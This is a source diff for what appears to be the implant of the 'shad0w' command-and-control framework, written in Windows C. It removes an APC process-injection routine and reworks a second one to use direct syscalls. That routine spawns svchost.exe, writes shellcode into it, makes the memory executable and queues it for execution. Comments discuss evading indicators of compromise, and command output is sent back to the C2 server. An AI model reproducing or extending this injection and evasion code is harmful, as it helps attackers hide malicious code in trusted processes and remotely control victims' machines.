@@ -24,99 +24,6 @@
 #define IDLE_KILL_TIME 60
 SYSTEMTIME start_time, current_time;
 
-// find a process that is suitable to inject into
-HANDLE FindProcess(const char* process)
-{   
-    DWORD PID               = 0;
-    HANDLE hProcess         = NULL;
-    DWORD dwProcCount       = 0;
-    WTS_PROCESS_INFO* pWPIs = NULL;
-
-    if(!WTSEnumerateProcesses(WTS_CURRENT_SERVER_HANDLE, NULL, 1, &pWPIs, &dwProcCount))
-    {
-        // error meaning we wont be able to get the processes
-        printf("WTSEnumerateProcesses fail\n");
-        return -1;
-    }
-
-    for(DWORD i = 0; i < dwProcCount; i++)
-    {
-        // check to see if we can infact open the process
-        hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pWPIs[i].ProcessId);
-
-        if (hProcess)
-        {
-            // if we can use the process, check it aint us an if it aint return the pid to the injector
-            if ((GetCurrentProcessId() != pWPIs[i].ProcessId) && (pWPIs[i].ProcessId != 0))
-            {
-                // free up the memory
-                WTSFreeMemory(pWPIs);
-                pWPIs = NULL;
-
-                // return the pid to the injector
-                return hProcess;
-            }
-        }
-        
-    }
-    // went through the loop and never got a pid :-(
-    return -1;
-}
-
-BOOL InjectModule(CHAR* Bytes, DWORD Size)
-{
-    // 
-    // This function is not in use
-    // 
-
-    PVOID rBuffer;
-    HANDLE hProcess;
-
-    // get a handle on a process
-    hProcess = FindProcess(NULL);
-
-    printf("Injecting into pid: %d\n", GetProcessId(hProcess));
-
-    rBuffer = VirtualAllocEx(hProcess, NULL, Size, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
-    WriteProcessMemory(hProcess, rBuffer, Bytes, Size, NULL);
-
-    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
-
-    DWORD threadId = 0;
-	THREADENTRY32 threadEntry;
-	threadEntry.dwSize = sizeof(THREADENTRY32);
-
-    BOOL bResult = Thread32First(hSnapshot, &threadEntry);
-	while (bResult)
-	{
-		bResult = Thread32Next(hSnapshot, &threadEntry);
-		if (bResult)
-		{
-			if (threadEntry.th32OwnerProcessID == GetProcessId(hProcess))
-			{
-				threadId = threadEntry.th32ThreadID;
-				HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, threadId);
-                DWORD dwResult = QueueUserAPC((PAPCFUNC)rBuffer, hThread, NULL);
-
-                printf("injected into tid: %d\n", threadId);
-
-                CloseHandle(hThread);
-			}
-		}
-	}
-
-	CloseHandle(hSnapshot);
-	CloseHandle(hProcess);
-
-    if (threadId == 0)
-    {
-        // this means that we couldnt find a thread to inject into
-        return FALSE;
-    }
-
-    return TRUE;
-}
-
 void ReadFromPipe(HANDLE g_hChildStd_OUT_Rd) 
 { 
    char chBuf[MAX_OUTPUT + 1];
@@ -130,7 +37,7 @@ void ReadFromPipe(HANDLE g_hChildStd_OUT_Rd)
         // read the data from the pipe
         bSuccess = ReadFile( g_hChildStd_OUT_Rd, chBuf, MAX_OUTPUT, &dwRead, NULL);
         
-        // send the data to shad0w
+        // send the data to shad0w c2
         BeaconCallbackC2(_C2_CALLBACK_ADDRESS, _C2_CALLBACK_PORT, _CALLBACK_USER_AGENT, 
                          &rOpCode, (char*)chBuf, DATA_CMD_OUT, dwRead);
         
@@ -164,7 +71,7 @@ void ProcessWatch(HANDLE pHandle)
     
 }
 
-BOOL InjectUserCode(CHAR* Bytes, SIZE_T Size)
+BOOL SpawnCode(CHAR* Bytes, SIZE_T Size)
 {
     /*
     Run user supplied code and send all the output back to them
@@ -262,30 +169,37 @@ BOOL InjectUserCode(CHAR* Bytes, SIZE_T Size)
     #ifdef SECURE
         DEBUG("doing secure exec");
 
-        // TODO: spawn svchost.exe with a different ppid an jus start it running
+        // bit of a race condition but the syscalls let us win it :)
+        // spawning svchost suspended could be an ioc so thats why we are not doing that.
+        // MAYBE: spawn svchost.exe with a different ppid an jus start it running
         CreateProcessA("C:\\Windows\\system32\\svchost.exe", NULL, NULL, NULL, TRUE, EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &sInfo, &pInfo);
 
         LPVOID rBuffer = NULL;
-
-        // alloc the memory we need inside the process, TODO: syscall
-        rBuffer = VirtualAllocEx(pInfo.hProcess, NULL, Size, (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);
+        SIZE_T uSize = (SIZE_T)Size;
 
         // make sure we are using the correct syscall numbers, probly a nicer way of doing this
         if ((osInfo.dwMajorVersion) == 10 && (osInfo.dwMinorVersion == 0))
         {
             NtQueueApcThread     = &NtQueueApcThread10;
             NtWriteVirtualMemory = &NtWriteVirtualMemory10;
+            NtAllocateVirtualMemory = &NtAllocateVirtualMemory10;
+            NtProtectVirtualMemory  = &NtProtectVirtualMemory10;
         } else if ((osInfo.dwMajorVersion) == 6 && (osInfo.dwMinorVersion == 3))
         {
             NtQueueApcThread     = &NtQueueApcThread81;
             NtWriteVirtualMemory = &NtWriteVirtualMemory81;
+            NtAllocateVirtualMemory = &NtAllocateVirtualMemory81;
+            NtProtectVirtualMemory  = &NtProtectVirtualMemory81;
         }
+
+        // alloc the memory we need inside the process
+        NtAllocateVirtualMemory(pInfo.hProcess, &rBuffer, 0, &uSize, (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);
 
         // write our shellcode bytes to the process
         NtWriteVirtualMemory(pInfo.hProcess, rBuffer, Bytes, Size, NULL);
 
-        // change the permisions on the memory so we can execute it, TODO: syscall
-        VirtualProtectEx(pInfo.hProcess, rBuffer, Size, PAGE_EXECUTE_READWRITE, &oProc);
+        // change the permisions on the memory so we can execute it
+        NtProtectVirtualMemory(pInfo.hProcess, &rBuffer, &uSize, PAGE_EXECUTE_READWRITE, &oProc);
 
         // execute the code inside the process
         NtQueueApcThread(pInfo.hThread, (PIO_APC_ROUTINE)rBuffer, NULL, NULL, NULL);
@@ -324,15 +238,10 @@ BOOL ExecuteMemory(char* Bytes, size_t Size, BOOL Module)
     {
         // select the correct way the code needs to be ran
         switch (Module)
-        {
-        case TRUE:
-            // execute module
-            InjectModule(Bytes, Size);
-            break;
-        
+        {        
         case FALSE:
             // execute arbitary user code
-            InjectUserCode(Bytes, Size);
+            SpawnCode(Bytes, Size);
         
         default:
             break;
